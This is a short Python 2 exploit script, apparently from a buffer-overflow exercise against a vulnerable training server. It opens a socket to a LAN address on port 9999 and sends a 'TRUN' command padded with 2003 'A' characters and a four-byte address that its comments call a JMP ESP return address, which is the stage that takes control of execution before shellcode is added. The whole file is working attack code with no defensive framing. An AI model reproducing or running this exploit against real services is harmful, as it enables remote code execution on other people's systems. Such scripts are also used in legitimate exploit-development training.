#!/usr/bin/python
 
import sys, socket                                                    # import modules to call ip and port



shellcode= "A" * 2003 + "\xaf\x11\x50\x62"                            # here we have the hex format of the opcode: JUMP ESP which will point to our exploit shell later

  
try:
         
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         # connect socket to ip and port
        s.connect(('192.168.1.12',9999))
         
        s.send(('TRUN /.:/' + shellcode))                             # payload sent
        s.close()                                                     # socket closed
        
except:
        print "error connecting to server"    
        sys.exit()
